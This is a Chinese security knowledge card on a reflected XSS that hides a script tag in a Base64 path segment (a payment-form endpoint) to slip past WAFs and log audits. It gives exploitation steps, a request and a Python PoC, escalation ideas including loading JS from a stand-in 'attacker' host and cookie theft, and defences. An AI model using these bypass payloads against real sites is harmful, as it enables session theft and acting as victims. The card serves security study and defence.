---
id: web-generic-xss-base64-path-decode-html-unescaped
title: 路径段先 Base64 再解码成 HTML 直接输出：请求里看不到标签，绕开只查原文的过滤与日志审计
type: scenario
domain: web
path: web/generic/xss
technique: base64-encoded-path-segment-decoded-html-xss
aliases:
- base64 参数反射型 XSS
- 编码绕过 XSS 过滤
- payForm base64 XSS
- 解码后未转义输出
tags:
- xss
- reflected-xss
- base64
- waf-bypass
- encoding
- java
- freemarker
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:54:58+08:00'
  notes: 已对照原文核对；本次核对未读取图片；正文给出的 URL 路径段 Base64（PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==）解码确为 <script>alert(1)</script>，与卡内一致；但「服务端解码后未转义写回 text/html」这一点在正文只有文字与截图（img/16.png），正文未给出响应头与响应体原文，该执行证据未在文本层验证；原文同时指出目标为 jeepay v2.4.0 + FreeMarker 2.3.31，属环境版本而非受影响区间，未设 versions；PoC 未对真实目标执行
---

## 一句话结论

当某个接口把路径段/参数当作 Base64 解出 HTML 片段再直接拼进响应（如支付表单渲染接口 `/api/common/payForm/<base64>`），攻击者把 `<script>alert(1)</script>` 编码成 Base64 放在 URL 里，服务端解码后原样输出——请求文本里看不到 `<`、`>`、`script`，所有只检查原始请求的 WAF 规则、只按原文匹配的输入过滤、只看 URL 的日志审计全部失效，而浏览器收到的仍是可执行标签。

## 原理

- **编码层与输出层错位**：安全控制通常检查“入参原文”（URL/body 里的字节），而浏览器执行的是“解码后的 HTML”。只要服务端在中间做了一次 `Base64.getDecoder().decode(...)` 或 `Base64.decodeBase64(...)`，两边的字符集就不再一致。
- **Base64 是编码不是加密**：任何人都能构造；它唯一的作用是让危险字符不出现在请求里。`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` 解码即 `<script>alert(1)</script>`。
- **路径段同样会被路由解码**：把 Base64 放在 path（`/api/common/payForm/<b64>`）而不是 query，`@PathVariable` 取到的就是解码后的原始字符串（Base64 里的 `+`/`/`/`=` 在路径中被 URL 编码处理），随后 `response.getWriter().write(decoded)` 或模板渲染输出，未做 HTML 转义即形成反射型 XSS。
- **为什么这是“真实缺陷”而非“扫描器误报”**：即便前端只把这段内容当支付表单 HTML 插入，只要响应 Content-Type 是 `text/html` 且未设置 `X-Content-Type-Options`/CSP，浏览器就会按 HTML 解析；攻击者可构造链接诱导用户点击，或在被嵌入的同源 iframe 中执行。
- **同族风险**：Base64 解码后进入 `innerHTML`（DOM XSS）、解码后拼进 FreeMarker/Thymeleaf 模板（可能升级为 SSTI）、解码后写入文件（配合包含）。

## 触发条件

- 接口接收 Base64（路径段、query 或 body），解码后把结果写入 HTML 响应而未转义。
- 响应 `Content-Type: text/html`（或浏览器会嗅探为 HTML），且无 CSP/`X-Content-Type-Options: nosniff` 限制。
- 无额外鉴权或鉴权可匿名通过（本题接口为公开支付表单入口）。
- 输入侧没有对“解码后内容”做二次校验（这是关键：过滤发生在解码前）。

## 利用步骤

1. 找到接收 Base64 的接口（路径段长且以 `==` 结尾、或参数名含 `data`/`form`/`content`）。
2. 用标准 Base64 编码 payload：`echo -n '<script>alert(1)</script>' | base64` → `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`。
3. 把编码串放进路径/参数；注意 `+`、`/`、`=` 需 URL 编码（`%2B`、`%2F`、`%3D`），否则路由会截断。
4. 访问该 URL，观察响应中是否出现解码后的 `<script>`；浏览器打开确认弹窗。
5. 升级为可用 payload：窃取 Cookie（若非 HttpOnly）、以受害者身份发起同源请求、加载外部 JS（`<script src=//attacker/x.js>`）。
6. 若响应被模板引擎二次渲染，可尝试把 payload 换成模板语法（`${...}`/`<#assign>`）判断是否能升级为 SSTI。

## PoC

```text
# 1) 生成 Base64
$ printf '%s' '<script>alert(1)</script>' | base64
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# 2) 放进路径段（原文形态）
GET /api/common/payForm/PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== HTTP/1.1
Host: target

# 3) 响应体中出现解码后的 <script>alert(1)</script>
```

```python
import base64, requests
payload = b"<script>alert(document.domain)</script>"
b64 = base64.b64encode(payload).decode()
r = requests.get(f"http://target/api/common/payForm/{b64}")
print(r.status_code, payload.decode() in r.text, r.headers.get("Content-Type"))
```

说明：PoC 按原文给出的 URL 形态整理（原文链接中的 Base64 段解码即 `<script>alert(1)</script>`），未对真实目标执行；部分框架会对 `=` 填充做特殊处理，必要时去掉填充或做 URL 编码。

## 变体与关联

- **编码变体**：Base64（标准/URL-safe）、Base32、十六进制、`encodeURIComponent` 双层编码、`unicode_escape`；本质都是“让危险字符不出现在入参文本里”。
- **注入位置变体**：路径段、query、`X-Forwarded-*` 头、Cookie、上传文件名；只要有一处解码后进 HTML 即可。
- **sink 变体**：`innerHTML`（DOM XSS）、`document.write`、模板字符串插值、FreeMarker `?no_esc`/Thymeleaf `th:utext`、`response.getWriter().write`。
- **关联**：`web-generic-xss-path-segment-reflected-svg`（同为路径段反射，但未编码）、`web-generic-xss-filter-bypass-encoding-obfuscation`（编码绕过过滤的通用清单）、`web-generic-xss-javascript-context-injection`（解码后落在 JS 上下文的变体）。
- **边界**：解码后做 HTML 转义（`HtmlUtils.htmlEscape`）、输出到 `text/plain`、有严格 CSP 且无可利用的同源脚本时，本卡退化为“需要用户交互的注入点”而非可执行 XSS。

## 检测与防御

- **输出编码**：所有进入 HTML 的动态内容按上下文转义（HTML/属性/JS/URL），与“来源是否经过编码”无关；优先使用模板引擎的自动转义（FreeMarker 默认 `?html`，Thymeleaf 的 `th:text`）。
- **输入校验**：在**解码之后**再做语法/白名单校验（例如只允许纯文本、禁止 `<`、`>`），而不是只检查原始请求。
- **响应头**：`Content-Type` 明确为 `text/html; charset=utf-8` 时配 CSP（`script-src 'self'`）、`X-Content-Type-Options: nosniff`；表单类接口可改为返回 JSON 由前端渲染。
- **WAF/审计**：除原文匹配外，对长 Base64 串做解码后再匹配（成本可控：只对长度/字符集符合 Base64 的参数解码检查）。
- **检测**：URL 路径中出现长 Base64 且解码结果含 `<`/`script`/`onerror`；同一接口返回体中出现未转义标签；`payForm` 类渲染接口被异常高频访问。
